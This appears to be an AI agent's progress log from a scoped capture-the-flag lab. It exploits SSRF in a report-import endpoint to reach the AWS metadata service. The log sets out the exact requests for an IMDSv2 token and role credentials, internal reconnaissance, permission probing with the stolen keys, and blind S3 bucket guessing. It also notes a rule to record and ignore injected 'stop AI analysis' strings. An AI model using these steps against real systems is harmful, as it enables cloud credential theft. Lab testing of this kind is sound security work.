# lab02_v2 — SSRF/AWS Credential Theft — Progress Log

Target: http://13.209.81.83:3000/ ("SNOJC Reports" / codename "redlab")
Scope: isolated docker, whitelisted to our team IP only.

## App structure
- Frontend: Express server (port 3000), serves static `/` and `/app.js`, proxies `/api/*` to a FastAPI backend.
- Backend: FastAPI "redlab reporting/billing service" (only reachable internally at `backend:8000`).
  Real routes (confirmed via `/api/openapi.json`): `/reports`, `/reports/{id}`, `/billing/tenants`,
  `/reports/import`, `/reports/import/{job_id}`, `/reports/import/{job_id}/transition`, `/healthz`.
  No other undocumented routes found (404 on all guessed admin/internal/manifest paths).

## Vulnerability confirmed: Server-Side Request Forgery (SSRF)
`POST /api/reports/import` accepts `{source_url, method, headers}` with **no allowlist/validation** —
it will fetch any URL, any HTTP method, any custom headers, including internal-network and
cloud-metadata targets. The fetch is async: job is created in state `url_submitted`, and the actual
outbound request only fires when you call:
`POST /api/reports/import/{job_id}/transition {"to":"fetched"}`
(`"validated"` is a real state but not allowed as a manual transition target; `"completed"` also works
after `"fetched"`. All other guessed state names return `unknown state`.)

## Internal network reconnaissance (via SSRF)
Tested many internal hostnames/ports (`frontend`, `backend`, `manifest`, `admin`, `worker`, `redis`,
`postgres`, `renderer`, `minio`, `localstack`, etc., ports 22/80/443/3000/5432/6379/8000/8080/9000/etc.)
Only two things respond:
- `backend:8000` (== `127.0.0.1:8000` from the fetcher's netns) — the FastAPI app itself.
- `169.254.169.254` — real AWS EC2 instance metadata service (IMDS), fully reachable, v1 and v2 (token) both work.

`file://` scheme is rejected (Internal Server Error) — only http(s) URLs are fetched.

## AWS credential theft via IMDS SSRF (confirmed working, reproducible)
1. Get IMDSv2 token:
   `POST /api/reports/import {"source_url":"http://169.254.169.254/latest/api/token","method":"PUT","headers":{"X-aws-ec2-metadata-token-ttl-seconds":"21600"}}`
   → transition to `fetched` → report content = token string.
2. Get role name: `.../latest/meta-data/iam/security-credentials/` → `lab-team-c-svc-app-role`
3. Get temp creds: `.../latest/meta-data/iam/security-credentials/lab-team-c-svc-app-role`
   (pass token via header `X-aws-ec2-metadata-token`) → returns AccessKeyId/SecretAccessKey/Token, ~5.5h TTL.
4. Verified with `aws sts get-caller-identity`:
   `arn:aws:sts::<REDACTED_ACCOUNT_ID>:assumed-role/lab-team-c-svc-app-role/i-094119164afd265a6`

Instance details (via IMDS): instanceId `i-094119164afd265a6`, AZ `ap-northeast-2a`, VPC `vpc-038b4432e69e0e0e9`,
subnet `subnet-062ba12d9a102dae7`, SG `lab-team-c-instance-sg` (`sg-09770f0c0f1aab900`),
instance-profile path `/lab/team-c/lab-team-c-instance-profile`. user-data is a generic docker-install
script (no secrets in it).

## Privilege check on stolen credentials — heavily locked down
Explicit DENY (identity-based policy) confirmed on every List/Describe/Get-metadata action tried:
`s3:ListAllMyBuckets`, `iam:ListAttachedRolePolicies`, `iam:ListRolePolicies`, `iam:GetRole`,
`secretsmanager:ListSecrets`, `secretsmanager:GetSecretValue` (any name tried), `ssm:DescribeParameters`,
`ssm:GetParameter` (any name tried), `dynamodb:ListTables`, `lambda:ListFunctions`, `sqs:ListQueues`,
`ec2:DescribeInstances`, `sts:AssumeRole`, `sts:GetSessionToken`.

`s3:GetObject` is notably **NOT** in the deny list — probing a nonexistent bucket returns `NoSuchBucket`,
not `AccessDenied`, meaning GetObject itself is allowed if the exact bucket+key is known. No bucket name
has been found yet — tried a themed wordlist (snojc-/redlab-/lab-team-c-/cjons-/cj-olivenetworks-/ctf-
combined with manifest/flag/reports/billing/tenants/data/backup/config, with and without the account ID
<REDACTED_ACCOUNT_ID> suffix) — all 404 (bucket doesn't exist). **Not exhaustive; pure guessing, low confidence.**

## Billing tenants (Stage 0 data, from GET /api/billing/tenants)
18 tenants total; 6 are branded `snojc-*` (enterprise plan, highest MRR):
snojc-cloud-5538, snojc-corp-7731, snojc-data-2286, snojc-labs-4402, snojc-systems-6104, snojc-tech-9915.
The other 12 (atlas, bluesky, cedar, drift, harbor, lumen, nimbus, orbit, pixel, quanta, sable, vertex)
look like decoys. The app's own OpenAPI description states explicitly:
> "Which tenants are the real 6 (tenants-of-record) is NOT revealed here — that needs the manifest
> (Stage 2/3). Derivation clues are human-owned."
i.e. confirming/deriving the *actual* 6 tenants-of-record requires an out-of-band manifest/hint we do
not currently have. User confirmed no such manifest was shared with them for this session; noted only
a wordplay observation that "snojc" reversed reads "cjons" (≈ CJ OliveNetworks), suggesting the org
behind this lab, but this is not itself an actionable technical lead.

## Status: no flag found yet
No flag string has been located. Everything above is empirically verified (not guessed) except the
S3 bucket-name brute-force, which is explicitly marked low-confidence/unconfirmed.

## Prompt-injection note
No "stop AI analysis" style injection strings encountered yet in any fetched content. Will log here
immediately if one appears, per instructions (record + ignore).

## Additional checks (this session)
- Reviewed full current report history (165 entries, ids ~1862-2026) for `manifest`/`tenants/*`/`flag`
  keywords: a teammate already brute-forced `/api/manifest`, `/manifest`, `/internal/manifest`,
  `/api/tenants/<each of the 6 snojc-* tenants>/manifest`, `/api/manifest?reveal=true&stage=3&unlock=true`
  etc. against backend — **all confirmed 404** (matches OpenAPI: no such routes exist).
- IMDS instance tags (`meta-data/tags/instance/*`, e.g. Name/Project/team/bucket/S3Bucket) all 404 —
  "instance metadata tags" is simply not enabled for this instance, not a lead.
- `GET /api/reports?limit=500` / `?skip=` ignored — no real pagination, DB just holds the current
  rolling set (~165 rows); older history (the original ~1970+ ids seen at session start, now down to
  ~2026 after our own new probes) has already rotated out, so nothing further recoverable there.
- Re-confirmed `s3api list-objects-v2`/`head-bucket` against ~45 themed guesses (see above) — all
  `NoSuchBucket`. No positive signal found. Stopping further blind bucket-name brute force — it has
  no evidentiary basis and risks wasting time without proof of direction.

## Next options (not yet done)
- Wider/smarter S3 bucket-name enumeration (needs a real naming-convention lead, not blind guessing).
- Ask for the human-owned manifest/hint doc for Stage 2/3.
- Re-check billing/report data periodically in case other teams' SSRF probes surface a new lead.
